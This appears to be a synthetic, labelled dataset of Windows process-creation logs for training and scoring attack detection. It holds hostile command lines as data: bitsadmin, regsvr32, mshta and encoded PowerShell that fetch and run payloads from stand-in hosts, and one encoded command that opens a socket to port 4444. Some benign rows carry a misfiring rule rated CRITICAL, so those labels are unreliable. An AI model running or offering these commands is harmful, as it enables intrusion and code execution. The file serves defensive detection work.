UtcTime,ProcessGuid,ProcessId,Image,CommandLine,ParentImage,ParentCommandLine,ParentProcessId,User,IntegrityLevel,is_malicious,mitre_technique_id,technique_name,label,parent_process_name,child_process_name,is_known_lolbin,is_scripting_engine,command_line_length,command_line_entropy,has_suspicious_flag,contains_url,contains_ip_address,has_base64_pattern,argument_count,suspicious_argument_ratio,has_encoded_command,has_download_indicator,process_ancestry_depth,parent_is_office_app,parent_is_browser,parent_is_script_engine,chain_hash,hour_of_day,is_off_hours,is_weekend,minute_of_hour,parent_child_pair_rarity,command_length_zscore,entropy_zscore,is_system_user,user_encoded,integrity_encoded,sigma_match,sigma_rule_name,sigma_level,sigma_mitre_tags,ml_anomaly_score,chain_risk_score,chain_description,chain_matched_pattern,final_verdict,priority,confidence,explanation
2024-07-05T11:37:58.701Z,{EB0E0EAF-FFDF-45D5-B148-C58489FFA1E8},23226,C:\Windows\System32\msiexec.exe,msiexec.exe /i http://fileserver.corp.local/package29.msi /quiet /norestart,C:\Windows\System32\cmd.exe,cmd.exe,61406,CORP\admin,High,0,,,gray_area,1,12,0,0,75,4.3379,0,1,0,0,5,0.0,0,0,2,0,0,1,67440360,11,0,0,37,3.9031,1.5356035753791188,0.7562621364457279,0,3,2,False,None,none,,70.84902053930479,15,cmd.exe → msiexec.exe: No known suspicious pattern [Modifiers: +15 URL in command],False,ALERT,MEDIUM,50.6,"ANOMALY SCORE: 71/100 | Unusual factors: URL found in command line: 1.00 (baseline: 0.01±0.11, z=9.4); unusual parent-child process relationship: 3.90 (baseline: 1.63±0.36, z=6.4); spawned by script engine: 1.00 (baseline: 0.06±0.24, z=3.9); deep process chain (possible multi-stage): 2.00 (baseline: 1.16±0.37, z=2.3)"
2024-07-04T03:35:29.727Z,{448B33CD-49BD-47DE-9845-F04037B789E7},38218,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe -exec bypass -noni -nop -w hidden -enc SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAKABHAGUAdAAtAEMAbwBuAHQAZQBuAHQAIABDADoAXABVAHMAZQByAHMAXABQAHUAYgBsAGkAYwBcAHAAYQB5AGwAbwBhAGQALgBwAHMAMQApAA==,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,WINWORD.EXE /n,50495,CORP\klee,Medium,1,T1059.001,PowerShell Encoded Command,malicious,10,3,1,1,214,4.6124,1,0,0,1,9,0.4444,1,0,2,1,0,0,3072976960,3,1,0,35,3.9031,7.108681825449551,1.167289222165689,0,6,1,True,Office Application Spawning Command Shell,critical,attack.t1204.002,100.0,100,"winword.exe → powershell.exe: Office Word directly spawning PowerShell [Modifiers: +20 Office→Script chain, +10 off-hours, +10 encoded command, +5 suspicious flags]",True,ALERT,CRITICAL,100.0,Sigma rule matched: Office Application Spawning Command Shell | ML Score: 100 | Chain Risk: 100
2024-07-05T17:08:36.872Z,{0BF48F7A-A3D7-41D9-97E0-8B8C261D81AC},32807,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Restart-Service -Name Spooler -Force""",C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,52662,CORP\itops,High,0,,,benign,1,3,1,1,73,4.3563,1,0,0,0,7,0.1429,0,0,2,0,0,1,4082297620,17,0,0,8,1.3846,1.4554153991191128,0.7838136788036412,0,5,2,True,PowerShell Encoded Command Execution,high,attack.t1059.001,57.80222771839365,5,cmd.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,95.8,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 58 | Chain Risk: 5
2024-07-05T01:06:59.219Z,{FEF77EFE-22F9-4909-8329-DED44479337E},61324,C:\Windows\System32\bitsadmin.exe,bitsadmin.exe /transfer job9572 /download /priority high http://loader-cdn3972.net/svc840.exe C:\Users\Public\update542.exe,C:\Windows\System32\cmd.exe,cmd.exe,34042,CORP\mjones,Medium,1,T1197,BITSAdmin Download,malicious,1,24,1,0,123,4.9598,1,1,0,0,8,0.125,0,1,2,0,0,1,3692683671,1,1,0,6,3.9031,3.460119805619268,1.6874743208145586,0,0,1,True,BITSAdmin File Download,high,attack.t1197,90.95662996880586,85,"cmd.exe → bitsadmin.exe: Command shell invoking bitsadmin [Modifiers: +15 URL in command, +10 off-hours, +5 suspicious flags]",True,ALERT,CRITICAL,99.1,Sigma rule matched: BITSAdmin File Download | ML Score: 91 | Chain Risk: 85
2024-07-05T17:46:35.297Z,{F6D0DC49-5C10-4BA2-8C89-C4460BBB6E05},3425,C:\Windows\System32\msiexec.exe,msiexec.exe /i http://deploy.corp.local/package32.msi /quiet /norestart,C:\Windows\System32\cmd.exe,cmd.exe,32948,CORP\itops,High,0,,,gray_area,1,12,0,0,71,4.3838,0,1,0,0,5,0.0,0,0,2,0,0,1,67440360,17,0,0,46,3.9031,1.3752272228591065,0.8249912556972618,0,5,2,False,None,none,,70.15120481938771,15,cmd.exe → msiexec.exe: No known suspicious pattern [Modifiers: +15 URL in command],False,ALERT,MEDIUM,50.1,"ANOMALY SCORE: 70/100 | Unusual factors: URL found in command line: 1.00 (baseline: 0.01±0.11, z=9.4); unusual parent-child process relationship: 3.90 (baseline: 1.63±0.36, z=6.4); spawned by script engine: 1.00 (baseline: 0.06±0.24, z=3.9); deep process chain (possible multi-stage): 2.00 (baseline: 1.16±0.37, z=2.3)"
2024-07-05T20:26:44.826Z,{0F29A547-D658-458D-8815-314DE1AD1E24},52920,C:\Windows\System32\mshta.exe,mshta.exe http://loader-cdn6172.org/payloads/script17.hta,C:\Windows\explorer.exe,cmd.exe,51630,CORP\agarwal,Medium,1,T1218.005,Mshta Remote HTA,malicious,0,5,1,1,57,4.4775,0,1,0,0,2,0.0,0,0,1,0,0,0,333442925,20,0,0,26,3.9031,0.813909989039063,0.9652944904220722,0,12,1,True,Mshta Remote HTA Execution,high,attack.t1218.005,79.46174399526238,55,explorer.exe → mshta.exe: Explorer launching HTA handler [Modifiers: +15 URL in command],True,ALERT,CRITICAL,97.9,Sigma rule matched: Mshta Remote HTA Execution | ML Score: 79 | Chain Risk: 55
2024-07-06T02:19:36.411Z,{9BC882FE-6E85-4ECC-9F3A-B9A1229EF197},53730,C:\Windows\Microsoft.NET\Framework\v3.5\MSBuild.exe,C:\Windows\Microsoft.NET\Framework\v3.5\MSBuild.exe C:\Users\Public\helper630.csproj,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe,15803,CORP\klee,Medium,1,T1127.001,MSBuild Inline Task,malicious,4,34,1,0,84,4.9667,0,0,0,0,2,0.0,0,0,2,0,0,1,3004846269,2,1,1,19,3.9031,1.896450368549147,1.6978061491987761,0,6,1,True,MSBuild Inline Task Execution,high,attack.t1127.001,81.45041697568783,80,powershell.exe → msbuild.exe: PowerShell spawning MSBuild [Modifiers: +10 off-hours],True,ALERT,CRITICAL,98.1,Sigma rule matched: MSBuild Inline Task Execution | ML Score: 81 | Chain Risk: 80
2024-07-05T23:15:06.335Z,{0E496732-2D73-43E2-B08E-115DFAE29E3B},34846,C:\Windows\System32\bitsadmin.exe,bitsadmin.exe /transfer wsus_update /download /priority normal http://internal-wsus.corp.local/update_kb7336179.cab C:\Windows\SoftwareDistribution\Download\update_kb7336179.cab,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p -s BITS,39166,NT AUTHORITY\SYSTEM,System,0,,,gray_area,2,24,1,0,177,4.847,1,1,0,0,8,0.125,0,1,1,0,0,0,583731811,23,0,0,15,3.9031,5.625200564639437,1.5185713872290882,1,2,3,True,BITSAdmin File Download,high,attack.t1197,94.22713535838679,30,"svchost.exe → bitsadmin.exe: No known suspicious pattern [Modifiers: +15 URL in command, +10 LOLBin child, +5 suspicious flags]",False,ALERT,CRITICAL,99.4,Sigma rule matched: BITSAdmin File Download | ML Score: 94 | Chain Risk: 30
2024-07-04T21:19:36.135Z,{D936F078-E546-4AF9-88A4-C502AF1D8C1E},59869,C:\Windows\System32\rundll32.exe,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();new%20ActiveXObject(""WScript.Shell"").Run(""cmd /c installer593.exe"")",C:\Windows\System32\cmd.exe,explorer.exe,52730,CORP\pchen,Medium,1,T1218.011,Rundll32 JavaScript,malicious,1,1,1,0,141,5.1135,1,0,0,0,5,0.2,0,0,2,0,0,1,606078729,21,0,0,19,3.9031,4.181813391959324,1.9176195414890869,0,1,1,True,Rundll32 JavaScript Execution,critical,attack.t1218.011,92.93656497669613,55,cmd.exe → rundll32.exe: Command shell invoking rundll32 [Modifiers: +5 suspicious flags],True,ALERT,CRITICAL,99.3,Sigma rule matched: Rundll32 JavaScript Execution | ML Score: 93 | Chain Risk: 55
2024-07-07T03:38:10.808Z,{BE16B100-A3DC-4DEA-8DB8-3C35F5D638B1},53072,C:\Windows\System32\regsvr32.exe,regsvr32.exe /s /n /u /i:http://cobaltstrike987.top/file140.sct scrobj.dll,C:\Windows\System32\cmd.exe,cmd.exe /c,42811,CORP\klee,Medium,1,T1218.010,Regsvr32 Squiblydoo,malicious,1,19,1,0,74,4.6655,1,1,0,0,6,0.1667,0,0,2,0,0,1,2398546659,3,1,1,38,3.9031,1.495509487249116,1.2467993797311892,0,6,1,True,Regsvr32 Squiblydoo Remote SCT Execution,critical,attack.t1218.010,90.08851883647444,85,"cmd.exe → regsvr32.exe: Command shell invoking regsvr32 [Modifiers: +15 URL in command, +10 off-hours, +5 suspicious flags]",True,ALERT,CRITICAL,99.0,Sigma rule matched: Regsvr32 Squiblydoo Remote SCT Execution | ML Score: 90 | Chain Risk: 85
2024-07-02T17:44:22.881Z,{995A3528-751F-4C4B-9555-E996988C00CE},47579,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-ChildItem -Path C:\Logs -Recurse -Filter *.log""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,40994,CORP\admin,High,0,,,benign,0,3,1,1,87,4.6553,1,0,0,0,9,0.1111,0,0,1,0,0,0,945137867,17,0,0,44,1.231,2.0167326329391564,1.2315262421197382,0,3,2,True,PowerShell Encoded Command Execution,high,attack.t1059.001,41.415470140573674,5,explorer.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,94.1,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 41 | Chain Risk: 5
2024-07-04T01:25:12.502Z,{01F598D3-9C47-430D-9CE6-2713F53BC67D},21824,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand QQBkAGQALQBUAHkAcABlACAALQBBAHMAcwBlAG0AYgBsAHkATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4ARAByAGEAdwBpAG4AZwA7ACQAZwA9AFsARAByAGEAdwBpAG4AZwAuAEIAaQB0AG0AYQBwAF0AOgA6AG4AZQB3ACgAJAB1ACkA,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,WINWORD.EXE /n,40529,CORP\jsmith,Medium,1,T1059.001,PowerShell Encoded Command,malicious,10,3,1,1,238,4.8054,1,0,0,1,6,0.5,1,0,2,1,0,0,3072976960,1,1,0,25,3.9031,8.070939940569627,1.4562809436372823,0,9,1,True,Office Application Spawning Command Shell,critical,attack.t1204.002,100.0,100,"winword.exe → powershell.exe: Office Word directly spawning PowerShell [Modifiers: +20 Office→Script chain, +10 off-hours, +10 encoded command, +5 suspicious flags]",True,ALERT,CRITICAL,100.0,Sigma rule matched: Office Application Spawning Command Shell | ML Score: 100 | Chain Risk: 100
2024-07-04T19:32:14.417Z,{FA6F86AF-248C-471F-ADEE-25FABEE3DACC},8395,C:\Windows\System32\bitsadmin.exe,bitsadmin.exe /transfer job3133 /download /priority high http://dropper-srv7787.cc/sys604.exe C:\Users\Public\loader690.exe,C:\Windows\System32\cmd.exe,cmd.exe,50899,CORP\mjones,Medium,1,T1197,BITSAdmin Download,malicious,1,24,1,0,123,4.9458,1,1,0,0,8,0.125,0,1,2,0,0,1,3692683671,19,0,0,32,3.9031,3.460119805619268,1.6665111907596242,0,0,1,True,BITSAdmin File Download,high,attack.t1197,89.9198477978753,75,"cmd.exe → bitsadmin.exe: Command shell invoking bitsadmin [Modifiers: +15 URL in command, +5 suspicious flags]",True,ALERT,CRITICAL,99.0,Sigma rule matched: BITSAdmin File Download | ML Score: 90 | Chain Risk: 75
2024-07-01T16:29:00.377Z,{56A14BA1-F580-4A7A-A694-997B90F1D729},14151,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Restart-Service -Name Spooler -Force""",C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,20109,CORP\itops,High,0,,,benign,1,3,1,1,73,4.3563,1,0,0,0,7,0.1429,0,0,2,0,0,1,4082297620,16,0,0,29,1.3846,1.4554153991191128,0.7838136788036412,0,5,2,True,PowerShell Encoded Command Execution,high,attack.t1059.001,56.42699800204795,5,cmd.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,95.6,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 56 | Chain Risk: 5
2024-07-01T10:23:44.144Z,{FE327C74-7540-456E-B397-BE5B7CE21940},34477,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-Service | Where-Object {$_.Status -eq 'Running'}""",C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,26458,CORP\sysadmin,High,0,,,benign,1,3,1,1,89,4.9011,1,0,0,0,9,0.1111,0,0,2,0,0,1,4082297620,10,0,0,23,1.3846,2.0969208091991622,1.599578911227083,0,10,2,True,PowerShell Encoded Command Execution,high,attack.t1059.001,50.467122154863574,5,cmd.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,95.0,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 50 | Chain Risk: 5
2024-07-01T08:44:21.836Z,{7B42B107-1879-4F63-A93A-E070EA509253},8903,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-WmiObject Win32_OperatingSystem | Select Caption, Version""",C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,57383,CORP\agarwal,Medium,0,,,benign,1,3,1,1,98,4.7762,1,0,0,0,9,0.1111,0,0,2,0,0,1,4082297620,8,0,0,44,1.3846,2.4577676023691906,1.4125578438084203,0,12,1,True,PowerShell Encoded Command Execution,high,attack.t1059.001,52.64779747371858,5,cmd.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,95.3,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 53 | Chain Risk: 5
2024-07-04T14:28:04.648Z,{DE4C6845-3BD0-47BB-AAA7-6FE7993D73BC},53074,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-EventLog -LogName System -Newest 50""",C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,58679,CORP\agarwal,Medium,0,,,benign,1,3,1,1,76,4.5494,1,0,0,0,8,0.125,0,0,2,0,0,1,4082297620,14,0,0,28,1.3846,1.575697663509122,1.072955136918485,0,12,1,True,PowerShell Encoded Command Execution,high,attack.t1059.001,46.74091076765957,5,cmd.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,94.7,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 47 | Chain Risk: 5
2024-07-05T12:38:34.172Z,{16AC70E8-68A1-40E1-898F-689FF15503DF},22210,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-Process | Sort-Object CPU -Descending | Select -First 10""",C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,65159,CORP\agarwal,Medium,0,,,benign,1,3,1,1,97,4.6495,1,0,0,0,12,0.0833,0,0,2,0,0,1,4082297620,12,0,0,38,1.3846,2.4176735142391874,1.2228415168112643,0,12,1,True,PowerShell Encoded Command Execution,high,attack.t1059.001,56.89505977895401,5,cmd.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,95.7,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 57 | Chain Risk: 5
2024-07-04T20:19:44.371Z,{8D03A306-606A-44BC-8865-383BEB5F5E04},10110,C:\Windows\System32\cmd.exe,cmd.exe /c powershell.exe -nop -w hidden -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAQwBQAEMAbABpAGUAbgB0ACgAJwAxADAALgAwAC4AMAAuADEAJwAsADQANAA0ADQAKQA7ACQAcwA9ACQAYwAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA=,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"" /n document15.docm",54545,CORP\agarwal,Medium,1,T1204.002,Office Macro Execution,malicious,12,4,1,1,234,4.6156,1,0,0,1,8,0.375,1,0,2,1,0,0,1267013000,20,0,0,19,3.9031,7.910563588049614,1.1720807947496734,0,12,1,True,Office Application Spawning Command Shell,critical,attack.t1204.002,100.0,100,"excel.exe → cmd.exe: Excel spawning command shell (macro indicator) [Modifiers: +20 Office→Script chain, +10 encoded command, +5 suspicious flags]",True,ALERT,CRITICAL,100.0,Sigma rule matched: Office Application Spawning Command Shell | ML Score: 100 | Chain Risk: 100
2024-07-02T13:08:47.799Z,{E50B5924-8BC8-4244-BC2B-6E88CB595224},58243,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-ChildItem -Path C:\Logs -Recurse -Filter *.log""",C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,18613,CORP\itops,High,0,,,benign,1,3,1,1,87,4.6553,1,0,0,0,9,0.1111,0,0,2,0,0,1,4082297620,13,0,0,8,1.3846,2.0167326329391564,1.2315262421197382,0,5,2,True,PowerShell Encoded Command Execution,high,attack.t1059.001,45.343570334282234,5,cmd.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,94.5,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 45 | Chain Risk: 5
2024-07-05T04:25:42.379Z,{E4723FA0-070E-46A1-87C3-AE81CB040527},9666,C:\Windows\System32\certutil.exe,certutil -decode C:\Users\Public\encoded5553.txt C:\Users\Public\decoded3947.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,cmd.exe,64442,CORP\jsmith,Medium,1,T1140,Certutil Base64 Decode,malicious,4,8,1,0,80,4.3968,1,0,0,0,4,0.25,0,0,2,0,0,1,2657444117,4,1,0,25,3.9031,1.7360740160291346,0.8444570193197007,0,9,1,True,Certutil Base64 Encode or Decode,high,attack.t1140,94.58555504044335,75,powershell.exe → certutil.exe: PowerShell invoking certutil [Modifiers: +10 off-hours],True,ALERT,CRITICAL,99.5,Sigma rule matched: Certutil Base64 Encode or Decode | ML Score: 95 | Chain Risk: 75
2024-07-01T21:37:31.055Z,{00E1CE58-6B44-49A9-9A28-F2DCEDFCD2C4},59359,C:\Windows\System32\regsvr32.exe,regsvr32.exe /s /n /u /i:http://malware-cdn3894.io/file891.sct scrobj.dll,C:\Windows\System32\cmd.exe,cmd.exe /c,29564,CORP\klee,Medium,1,T1218.010,Regsvr32 Squiblydoo,malicious,1,19,1,0,73,4.7496,1,1,0,0,6,0.1667,0,0,2,0,0,1,2398546659,21,0,0,37,3.9031,1.4554153991191128,1.3727278967040448,0,6,1,True,Regsvr32 Squiblydoo Remote SCT Execution,critical,attack.t1218.010,88.97667752231823,75,"cmd.exe → regsvr32.exe: Command shell invoking regsvr32 [Modifiers: +15 URL in command, +5 suspicious flags]",True,ALERT,CRITICAL,98.9,Sigma rule matched: Regsvr32 Squiblydoo Remote SCT Execution | ML Score: 89 | Chain Risk: 75
2024-07-03T19:38:54.413Z,{4DEE51B0-6B0D-4376-B339-815414042F8E},9045,C:\Windows\System32\bitsadmin.exe,bitsadmin.exe /transfer job1766 /download /priority high http://c2-server6478.io/sys605.exe C:\Users\Public\sys948.exe,C:\Windows\System32\cmd.exe,cmd.exe,16261,CORP\mjones,Medium,1,T1197,BITSAdmin Download,malicious,1,24,1,0,118,4.9549,1,1,0,0,8,0.125,0,1,2,0,0,1,3692683671,19,0,0,38,3.9031,3.2596493649692526,1.6801372252953315,0,0,1,True,BITSAdmin File Download,high,attack.t1197,89.78335421999574,75,"cmd.exe → bitsadmin.exe: Command shell invoking bitsadmin [Modifiers: +15 URL in command, +5 suspicious flags]",True,ALERT,CRITICAL,99.0,Sigma rule matched: BITSAdmin File Download | ML Score: 90 | Chain Risk: 75
2024-07-02T12:05:41.369Z,{95EAC93A-29BD-477E-BCF4-040DAAB666A9},17409,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-Disk | Get-Partition | Get-Volume""",C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,6401,CORP\mjones,Medium,0,,,benign,1,3,1,1,74,4.4639,1,0,0,0,8,0.125,0,0,2,0,0,1,4082297620,12,0,0,5,1.3846,1.495509487249116,0.9449303069401356,0,0,1,True,PowerShell Encoded Command Execution,high,attack.t1059.001,48.696627451914125,5,cmd.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,94.9,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 49 | Chain Risk: 5
2024-07-04T13:37:31.791Z,{F4DBEA1F-D56D-40A3-9608-5B863AC88445},51848,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Set-ExecutionPolicy RemoteSigned -Scope CurrentUser""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,13807,CORP\itops,High,0,,,benign,0,3,1,1,88,4.5334,1,0,0,0,7,0.1429,0,0,1,0,0,0,945137867,13,0,0,37,1.231,2.0568267210691595,1.0489972739985602,0,5,2,True,PowerShell Encoded Command Execution,high,attack.t1059.001,41.780974825849896,5,explorer.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,94.2,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 42 | Chain Risk: 5
2024-07-01T16:35:19.533Z,{A91672AC-38EC-4B3C-9D7E-CD0774A022F0},23328,C:\Windows\System32\bitsadmin.exe,bitsadmin.exe /transfer wsus_update /download /priority normal http://sccm01.corp.local/update_kb4585870.cab C:\Windows\SoftwareDistribution\Download\update_kb4585870.cab,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p -s BITS,50613,NT AUTHORITY\SYSTEM,System,0,,,gray_area,2,24,1,0,170,4.8889,1,1,0,0,8,0.125,0,1,1,0,0,0,583731811,16,0,0,35,3.9031,5.3445419477294145,1.5813110407506403,1,2,3,True,BITSAdmin File Download,high,attack.t1197,91.8220079178424,30,"svchost.exe → bitsadmin.exe: No known suspicious pattern [Modifiers: +15 URL in command, +10 LOLBin child, +5 suspicious flags]",False,ALERT,CRITICAL,99.2,Sigma rule matched: BITSAdmin File Download | ML Score: 92 | Chain Risk: 30
2024-07-04T15:11:10.686Z,{CEFF57A5-E2F0-4E55-B719-8EE4AF5CA26D},61468,C:\Windows\System32\regsvr32.exe,regsvr32.exe /s /n /u /i:http://stager3419.top/file55.sct scrobj.dll,C:\Windows\System32\cmd.exe,cmd.exe /c,3825,CORP\jsmith,Medium,1,T1218.010,Regsvr32 Squiblydoo,malicious,1,19,1,0,68,4.575,1,1,0,0,6,0.1667,0,0,2,0,0,1,2398546659,15,0,0,11,3.9031,1.2549449584690973,1.1112877175903646,0,9,1,True,Regsvr32 Squiblydoo Remote SCT Execution,critical,attack.t1218.010,87.4065866541089,75,"cmd.exe → regsvr32.exe: Command shell invoking regsvr32 [Modifiers: +15 URL in command, +5 suspicious flags]",True,ALERT,CRITICAL,98.7,Sigma rule matched: Regsvr32 Squiblydoo Remote SCT Execution | ML Score: 87 | Chain Risk: 75
2024-07-07T03:00:07.560Z,{390FFEF3-A70C-4F70-B0B7-5B2DE0492DD0},23849,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -Command ""Invoke-GPUpdate -Computer DC01 -Force""",C:\Windows\System32\cmd.exe,cmd.exe,5427,CORP\admin,High,0,,,gray_area,1,3,1,1,63,4.6084,0,0,0,0,6,0.0,0,0,2,0,0,1,4082297620,3,1,1,0,1.3846,1.0544745178190815,1.161299756435707,0,3,2,False,None,none,,78.56269940522772,10,cmd.exe → powershell.exe: No known suspicious pattern [Modifiers: +10 off-hours],False,ALERT,MEDIUM,55.7,"ANOMALY SCORE: 79/100 | Unusual factors: weekend execution: 1.00 (baseline: 0.00±0.00, z=1000.0); spawned by script engine: 1.00 (baseline: 0.06±0.24, z=3.9); execution during off-hours (midnight-5am): 1.00 (baseline: 0.10±0.30, z=3.0); deep process chain (possible multi-stage): 2.00 (baseline: 1.16±0.37, z=2.3)"
2024-07-02T16:02:24.676Z,{AB465630-F8CE-4666-820F-96C5AF0260D8},13517,C:\Windows\System32\mshta.exe,mshta.exe http://apt-infra1495.cc/payloads/script548.hta,C:\Windows\explorer.exe,explorer.exe,20586,CORP\mjones,Medium,1,T1218.005,Mshta Remote HTA,malicious,0,5,1,1,56,4.4495,0,1,0,0,2,0.0,0,0,1,0,0,0,333442925,16,0,0,2,3.9031,0.7738159009090598,0.9233682303122029,0,0,1,True,Mshta Remote HTA Execution,high,attack.t1218.005,77.78540999049346,55,explorer.exe → mshta.exe: Explorer launching HTA handler [Modifiers: +15 URL in command],True,ALERT,CRITICAL,97.8,Sigma rule matched: Mshta Remote HTA Execution | ML Score: 78 | Chain Risk: 55
2024-07-04T12:59:40.545Z,{8B8360AD-EC29-4A6E-BE62-33571E124121},54014,C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe,C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe C:\Users\Public\core721.csproj,C:\Windows\System32\cmd.exe,cmd.exe,41266,CORP\agarwal,Medium,1,T1127.001,MSBuild Inline Task,malicious,1,34,1,0,88,5.0293,0,0,0,0,2,0.0,0,0,2,0,0,1,442785036,12,0,0,59,3.9031,2.0568267210691595,1.791541287872982,0,12,1,True,MSBuild Inline Task Execution,high,attack.t1127.001,74.29255180868269,65,cmd.exe → msbuild.exe: Command shell spawning MSBuild,True,ALERT,CRITICAL,97.4,Sigma rule matched: MSBuild Inline Task Execution | ML Score: 74 | Chain Risk: 65
